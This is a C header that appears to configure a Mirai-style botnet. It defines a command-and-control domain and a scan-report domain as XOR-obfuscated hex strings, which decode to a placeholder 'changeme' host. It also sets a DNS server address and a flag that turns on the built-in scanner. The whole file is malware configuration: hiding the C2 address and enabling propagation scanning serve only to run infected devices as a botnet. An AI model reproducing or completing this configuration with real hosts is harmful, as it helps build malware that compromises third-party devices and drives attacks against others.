#ifndef CONFIG_H 
#define CONFIG_H 
#define DOMAIN_NAME "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22"
#define DOMAIN_NAME_LEN 17
#define SCAN_DOMAIN_NAME "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22"
#define SCAN_DOMAIN_NAME_LEN 17
#define DNS_0 192
#define DNS_1 168
#define DNS_2 153
#define DNS_3 131
#define INIT_SCANNER
#endif
